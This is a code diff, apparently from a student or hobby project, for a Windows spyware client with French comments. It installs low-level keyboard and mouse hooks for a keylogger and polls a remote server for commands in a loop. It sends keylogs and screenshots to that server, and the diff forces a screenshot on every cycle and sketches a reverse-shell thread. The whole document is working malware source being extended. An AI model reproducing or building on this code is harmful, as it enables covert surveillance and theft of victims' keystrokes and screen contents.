@@ -2,7 +2,7 @@
 
 EXTERN_C_START
 
-DWORD ThreadKeylogger(VOID)
+DWORD ThreadKeylogger()
 {
     //Hooks sur le clavier et la souris pour le keylogger
     if (!SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
@@ -132,7 +132,7 @@ VOID SendScreenshot()
     }
 
     LPSTR base64string = NULL;
-    if ((base64string = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (destinationSize + 1000) * sizeof(CHAR)))) == NULL)
+    if ((base64string = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (destinationSize + 1) * sizeof(CHAR)))) == NULL)
     {
         CloseHandle(hFile);
         return;
@@ -197,9 +197,6 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
     //Thread de polling
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);
 
-    CHAR uuid[UUID_SIZE] = { 0 };
-    GetUuid(uuid);
-
     while (TRUE)
     {
         printf("Sending client informations\n");
@@ -210,8 +207,11 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
         printf("Polling for new commands ...\n");
         Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);
 
+        commands.screenshot = TRUE;
+
         if (commands.keylogs)
         {
+
             printf("Sending keylogs ...\n");
             SendKeylogs();
         }
@@ -224,6 +224,9 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
         {
             printf("Opening reverse shell ...\n");
             //Create Thread with Samuel's program
+
+            //Thread de Reverse Shell
+            //HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadReverseShell, NULL, 0, NULL);
         }
 
         Sleep(5000);
